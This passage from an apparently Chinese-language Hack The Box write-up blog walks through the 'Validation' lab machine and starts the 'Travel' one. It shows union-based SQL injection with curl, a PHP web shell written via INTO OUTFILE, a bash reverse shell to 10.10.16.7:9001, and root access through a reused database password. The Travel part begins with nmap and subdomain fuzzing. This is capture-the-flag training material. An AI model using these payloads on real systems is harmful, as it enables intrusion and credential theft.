46<br>&gt; Content-Type: application/x-www-form-urlencoded<br>&gt; <br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 302 Found<br>&lt; Date: Tue, 17 May 2022 01:55:16 GMT<br>&lt; Server: Apache/2.4.48 (Debian)<br>&lt; X-Powered-By: PHP/7.4.23<br>&lt; Set-Cookie: user=d78b6f30225cdc811adfe8d4e7c9fd34<br>&lt; Location: /account.php<br>&lt; Content-Length: 0<br>&lt; Content-Type: text/html; charset=UTF-8<br>&lt; <br>* Connection #0 to host validation.htb left intact<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -v --cookie <span class="hljs-string">&quot;user=21232f297a57a5a743894a0e4a801fc3&quot;</span> http://validation.htb/account.php<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bootstrap-css&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-comment">&lt;!------ Include the above in your HEAD tag ----------&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-center m-5&quot;</span>&gt;</span>Join the UHC - September Qualifiers<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">section</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;bg-dark text-center p-5 mt-4&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container p-5&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-white&quot;</span>&gt;</span>Welcome admin<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-white&quot;</span>&gt;</span>Other Players In Belgium&#x27; union select 1-- -<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;text-white&#x27;</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>* Connection #0 to host validation.htb left intact<br></code></pre></td></tr></table></figure><p>看起来有回显。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -v -d <span class="hljs-string">&quot;username=hack&amp;country=Brazil&#x27;union select user()--+&quot;</span> http://validation.htb<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -v --cookie <span class="hljs-string">&quot;user=d78b6f30225cdc811adfe8d4e7c9fd34&quot;</span> http://validation.htb/account.php<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;div class=<span class="hljs-string">&quot;container&quot;</span>&gt;<br>&lt;h1 class=<span class="hljs-string">&quot;text-center m-5&quot;</span>&gt;Join the UHC - September Qualifiers&lt;/h1&gt;<br><br>&lt;/div&gt;<br>&lt;section class=<span class="hljs-string">&quot;bg-dark text-center p-5 mt-4&quot;</span>&gt;<br>&lt;div class=<span class="hljs-string">&quot;container p-5&quot;</span>&gt;<br>            &lt;h1 class=<span class="hljs-string">&quot;text-white&quot;</span>&gt;Welcome hack&lt;/h1&gt;&lt;h3 class=<span class="hljs-string">&quot;text-white&quot;</span>&gt;Other Players In Brazil<span class="hljs-string">&#x27;union select user()-- &lt;/h3&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;mosaic&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;mosaicd&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;uhc@localhost&lt;/li&gt;&lt;/div&gt;</span><br><span class="hljs-string">&lt;/section&gt;</span><br><span class="hljs-string">&lt;/div&gt;</span><br></code></pre></td></tr></table></figure><p>获取到当前用户：uhc@localhost。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -v --cookie <span class="hljs-string">&quot;user=d78b6f30225cdc811adfe8d4e7c9fd34&quot;</span> http://validation.htb/account.php<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!------ Include the above <span class="hljs-keyword">in</span> your HEAD tag ----------&gt;<br><br>&lt;div class=<span class="hljs-string">&quot;container&quot;</span>&gt;<br>&lt;h1 class=<span class="hljs-string">&quot;text-center m-5&quot;</span>&gt;Join the UHC - September Qualifiers&lt;/h1&gt;<br><br>&lt;/div&gt;<br>&lt;section class=<span class="hljs-string">&quot;bg-dark text-center p-5 mt-4&quot;</span>&gt;<br>&lt;div class=<span class="hljs-string">&quot;container p-5&quot;</span>&gt;<br>            &lt;h1 class=<span class="hljs-string">&quot;text-white&quot;</span>&gt;Welcome hack&lt;/h1&gt;&lt;h3 class=<span class="hljs-string">&quot;text-white&quot;</span>&gt;Other Players In Brazil<span class="hljs-string">&#x27;union select database()-- &lt;/h3&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;mosaic&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;mosaicd&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;registration&lt;/li&gt;&lt;/div&gt;</span><br><span class="hljs-string">&lt;/section&gt;</span><br><span class="hljs-string">&lt;/div&gt;</span><br><span class="hljs-string">* Connection #0 to host validation.htb left intact</span><br></code></pre></td></tr></table></figure><p>当前数据库registration:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -v -d <span class="hljs-string">&quot;username=hack&amp;country=Brazil&#x27;union select privilege_type FROM information_schema.user_privileges where grantee = \&quot;&#x27;uhc&#x27;@&#x27;localhost&#x27;\&quot;-- -&quot;</span> http://validation.htb<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -v --cookie <span class="hljs-string">&quot;user=d78b6f30225cdc811adfe8d4e7c9fd34&quot;</span> http://validation.htb/account.php<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;section class=<span class="hljs-string">&quot;bg-dark text-center p-5 mt-4&quot;</span>&gt;<br>&lt;div class=<span class="hljs-string">&quot;container p-5&quot;</span>&gt;<br>            &lt;h1 class=<span class="hljs-string">&quot;text-white&quot;</span>&gt;Welcome hack&lt;/h1&gt;&lt;h3 class=<span class="hljs-string">&quot;text-white&quot;</span>&gt;Other Players In Brazil<span class="hljs-string">&#x27;union select privilege_type FROM information_schema.user_privileges where grantee = &quot;&#x27;</span>uhc<span class="hljs-string">&#x27;@&#x27;</span>localhost<span class="hljs-string">&#x27;&quot;-- -&lt;/h3&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;mosaic&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;mosaicd&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;SELECT&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;INSERT&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;UPDATE&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;DELETE&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;CREATE&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;DROP&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;RELOAD&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;SHUTDOWN&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;PROCESS&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;FILE&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;REFERENCES&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;INDEX&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;ALTER&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;SHOW DATABASES&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;SUPER&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;CREATE TEMPORARY TABLES&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;LOCK TABLES&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;EXECUTE&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;REPLICATION SLAVE&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;BINLOG MONITOR&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;CREATE VIEW&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;SHOW VIEW&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;CREATE ROUTINE&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;ALTER ROUTINE&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;CREATE USER&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;EVENT&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;TRIGGER&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;CREATE TABLESPACE&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;DELETE HISTORY&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;SET USER&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;FEDERATED ADMIN&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;CONNECTION ADMIN&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;READ_ONLY ADMIN&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;REPLICATION SLAVE ADMIN&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;REPLICATION MASTER ADMIN&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;BINLOG ADMIN&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;BINLOG REPLAY&lt;/li&gt;&lt;li class=&#x27;</span>text-white<span class="hljs-string">&#x27;&gt;SLAVE MONITOR&lt;/li&gt;&lt;/div&gt;</span><br><span class="hljs-string">&lt;/section&gt;</span><br><span class="hljs-string">&lt;/div&gt;</span><br><span class="hljs-string">* Connection #0 to host validation.htb left intact</span><br></code></pre></td></tr></table></figure><p>我当前的用户权限很多，而且它拥有File权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -v -d <span class="hljs-string">&quot;username=hack&amp;country=Belgium&#x27; union select &#x27; can you see me ?&#x27; into outfile &#x27;/var/www/html/test.txt&#x27;-- - &quot;</span> http://validation.htb/<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -v --cookie <span class="hljs-string">&quot;user=d78b6f30225cdc811adfe8d4e7c9fd34&quot;</span> http://validation.htb/account.php<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;div class=<span class="hljs-string">&quot;container&quot;</span>&gt;<br>&lt;h1 class=<span class="hljs-string">&quot;text-center m-5&quot;</span>&gt;Join the UHC - September Qualifiers&lt;/h1&gt;<br><br>&lt;/div&gt;<br>&lt;section class=<span class="hljs-string">&quot;bg-dark text-center p-5 mt-4&quot;</span>&gt;<br>&lt;div class=<span class="hljs-string">&quot;container p-5&quot;</span>&gt;<br>            &lt;h1 class=<span class="hljs-string">&quot;text-white&quot;</span>&gt;Welcome hack&lt;/h1&gt;&lt;h3 class=<span class="hljs-string">&quot;text-white&quot;</span>&gt;Other Players In Belgium<span class="hljs-string">&#x27; union select &#x27;</span> can you see me ?<span class="hljs-string">&#x27; into outfile &#x27;</span>/var/www/html/test.txt<span class="hljs-string">&#x27;-- - &lt;/h3&gt;&lt;br /&gt;</span><br><span class="hljs-string">&lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33</span><br><span class="hljs-string">Stack trace:</span><br><span class="hljs-string">#0 &#123;main&#125;</span><br><span class="hljs-string">  thrown in &lt;b&gt;/var/www/html/account.php&lt;/b&gt; on line &lt;b&gt;33&lt;/b&gt;&lt;br /&gt;</span><br><span class="hljs-string">* Connection #0 to host validation.htb left intact</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl http://validation.htb/test.txt                                                       <br> can you see me ?<br>                  <br></code></pre></td></tr></table></figure><p>我可以写WebShell，符号太多会出错，可进行编码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -v -d <span class="hljs-string">&quot;username=hack&amp;country=Belgium&#x27; union select %22%3C%3Fphp%20SYSTEM(%24_REQUEST%5B%27cmd%27%5D)%3B%20%3F%3E%22%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fhtml%2Fshell.php%27%3B--%20-&quot;</span> http://validation.htb<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -v --cookie <span class="hljs-string">&quot;user=d78b6f30225cdc811adfe8d4e7c9fd34&quot;</span> http://validation.htb/account.php<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl http://validation.htb/shell.php?cmd=<span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><h4 id="Reverse-shell："><a href="#Reverse-shell：" class="headerlink" title="Reverse shell："></a>Reverse shell：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl http://validation.htb/shell.php --data-urlencode <span class="hljs-string">&#x27;cmd=bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.7/9001 0&gt;&amp;1&quot;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; nc -lvnp 9001<br>listening on [any] 9001 ...<br>connect to [10.10.16.7] from (UNKNOWN) [10.10.11.116] 40708<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@validation:/var/www/html$<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">script /dev/null -c bash<br>^Z<br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br>reset<br>screen<br></code></pre></td></tr></table></figure><p>对用户目录有读取权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@validation:/var/www/html$ <span class="hljs-built_in">ls</span><br>account.php  config.php  css  index.php  js  shell.php<br>www-data@validation:/var/www/html$ <span class="hljs-built_in">cd</span> ~<br>www-data@validation:/var/www$ <span class="hljs-built_in">ls</span><br>html<br>www-data@validation:/var/www$ <span class="hljs-built_in">cd</span> /<br>www-data@validation:/$ <span class="hljs-built_in">cd</span> home/<br>www-data@validation:/home$ <span class="hljs-built_in">ls</span><br>htb<br>www-data@validation:/home$ <span class="hljs-built_in">cd</span> htb/<br>www-data@validation:/home/htb$ <span class="hljs-built_in">ls</span><br>user.txt<br>www-data@validation:/home/htb$ <span class="hljs-built_in">cat</span> user.txt <br>07..................................<br></code></pre></td></tr></table></figure><p>在配置文件里有一串密码，uhc用户会提示不存在，但是尝试密码复用root会成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@validation:/var/www/html$ <span class="hljs-built_in">ls</span><br>account.php  config.php  css  index.php  js<br>www-data@validation:/var/www/html$ <span class="hljs-built_in">cat</span> config.php <br>&lt;?php<br>  <span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br>  <span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;uhc&quot;</span>;<br>  <span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;uhc-9qual-global-pw&quot;</span>;<br>  <span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;registration&quot;</span>;<br><br>  <span class="hljs-variable">$conn</span> = new mysqli(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<br>?&gt;<br>www-data@validation:/var/www/html$ su uhc<br>su: user uhc does not exist or the user entry does not contain all the required fields<br>www-data@validation:/var/www/html$ su -<br>Password: <br>root@validation:~<span class="hljs-comment"># cat /root/root.txt </span><br>7a..................................<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Travel</title>
    <link href="/post/HackTheBox-Travel.html"/>
    <url>/post/HackTheBox-Travel.html</url>
    
    <content type="html"><![CDATA[<p>Hack The Box - Travel</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs coq"># Nmap <span class="hljs-number">7.92</span> scan initiated Mon Apr <span class="hljs-number">11</span> <span class="hljs-number">22</span>:<span class="hljs-number">34</span>:<span class="hljs-number">57</span> <span class="hljs-number">2022</span> <span class="hljs-built_in">as</span>: nmap -sV -sC -Pn -T4 -p- -oA nmap.txt <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.189</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.189</span><br>Host is up (<span class="hljs-number">0.33</span>s latency).<br>Not shown: <span class="hljs-number">65529</span> closed tcp ports (reset)<br>PORT      STATE    SERVICE    VERSION<br><span class="hljs-number">22</span>/tcp    open     ssh        OpenSSH <span class="hljs-number">8.2</span>p1 Ubuntu <span class="hljs-number">4</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-type">ssh</span>-hostkey: <br>|   <span class="hljs-type">3072</span> d3:<span class="hljs-number">9</span>f:<span class="hljs-number">31</span>:<span class="hljs-number">95</span>:<span class="hljs-number">7</span>e:<span class="hljs-number">5</span>e:<span class="hljs-number">11</span>:<span class="hljs-number">45</span>:a2:b4:b6:<span class="hljs-number">34</span>:c0:<span class="hljs-number">2</span>d:<span class="hljs-number">2</span>d:bc (RSA)<br>|   <span class="hljs-type">256</span> ef:<span class="hljs-number">3</span>f:<span class="hljs-number">44</span>:<span class="hljs-number">21</span>:<span class="hljs-number">46</span>:<span class="hljs-number">8</span>d:eb:<span class="hljs-number">6</span>c:<span class="hljs-number">39</span>:<span class="hljs-number">9</span>c:<span class="hljs-number">78</span>:<span class="hljs-number">4</span>f:<span class="hljs-number">50</span>:b3:f3:<span class="hljs-number">6</span>b (ECDSA)<br>|<span class="hljs-type">_</span>  <span class="hljs-number">256</span> <span class="hljs-number">3</span>a:<span class="hljs-number">01</span>:bc:f8:<span class="hljs-number">57</span>:f5:<span class="hljs-number">27</span>:a1:<span class="hljs-number">68</span>:<span class="hljs-number">1</span>d:<span class="hljs-number">6</span>a:<span class="hljs-number">3</span>d:<span class="hljs-number">4</span>e:bc:<span class="hljs-number">21</span>:<span class="hljs-number">1</span>b (ED25519)<br><span class="hljs-number">80</span>/tcp    open     http       nginx <span class="hljs-number">1.17</span><span class="hljs-number">.6</span><br>|<span class="hljs-type">_http</span>-title: Travel.HTB<br>|<span class="hljs-type">_http</span>-server-header: nginx/<span class="hljs-number">1.17</span><span class="hljs-number">.6</span><br><span class="hljs-number">443</span>/tcp   open     ssl/http   nginx <span class="hljs-number">1.17</span><span class="hljs-number">.6</span><br>|<span class="hljs-type">_http</span>-title: Travel.HTB - SSL coming soon.<br>| <span class="hljs-type">ssl</span>-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK<br>| <span class="hljs-type">Subject</span> Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb<br>| <span class="hljs-type">Not</span> valid <span class="hljs-built_in">before</span>: <span class="hljs-number">2020</span><span class="hljs-number">-04</span><span class="hljs-number">-23</span>T19:<span class="hljs-number">24</span>:<span class="hljs-number">29</span><br>|<span class="hljs-type">_Not</span> valid <span class="hljs-built_in">after</span>:  <span class="hljs-number">2030</span><span class="hljs-number">-04</span><span class="hljs-number">-21</span>T19:<span class="hljs-number">24</span>:<span class="hljs-number">29</span><br>|<span class="hljs-type">_ssl</span>-date: TLS randomness does not represent <span class="hljs-built_in">time</span><br>|<span class="hljs-type">_http</span>-server-header: nginx/<span class="hljs-number">1.17</span><span class="hljs-number">.6</span><br><span class="hljs-number">1960</span>/tcp  filtered nasmanager<br><span class="hljs-number">24383</span>/tcp filtered unknown<br><span class="hljs-number">48921</span>/tcp filtered unknown<br>Service <span class="hljs-keyword">Info</span>: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results <span class="hljs-built_in">at</span> https://nmap.org/submit/ .<br># Nmap done <span class="hljs-built_in">at</span> Mon Apr <span class="hljs-number">11</span> <span class="hljs-number">22</span>:<span class="hljs-number">55</span>:<span class="hljs-number">03</span> <span class="hljs-number">2022</span> -- <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-built_in">in</span> <span class="hljs-number">1205.27</span> seconds<br></code></pre></td></tr></table></figure><p>22端口不需要看，有用户名枚举漏洞，80端口存在有nginx 1.17.6，站点标题Travel.HTB，443HTTPS服务有DNS解析记录，一共三个域名：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">www<span class="hljs-selector-class">.travel</span><span class="hljs-selector-class">.htb</span><br>blog<span class="hljs-selector-class">.travel</span><span class="hljs-selector-class">.htb</span><br>blog-dev<span class="hljs-selector-class">.travel</span>.htb<br></code></pre></td></tr></table></figure><p>为了不漏掉一些资产，我想先测试一次目标80端口是否还会存在着其他域名，我可以使用wfuzz：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wfuzz -c -w subdomains -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.189</span> -H <span class="hljs-string">&quot;Host: FUZZ.travel.htb&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span 